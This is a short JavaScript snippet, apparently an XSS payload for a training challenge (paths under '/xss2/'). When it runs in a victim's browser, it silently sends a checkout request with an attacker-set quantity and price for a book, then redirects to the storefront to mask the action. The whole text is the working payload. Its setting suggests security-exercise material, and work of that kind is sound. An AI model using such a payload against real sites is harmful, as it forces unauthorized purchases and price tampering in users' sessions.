var request = new XMLHttpRequest();
request.open("GET", "/xss2/checkout?id=3&qty=999&name=Twenty Thousand Leagues Under The Sea&price=24000", true);
request.send(null);
window.location.replace("/xss2/storefront");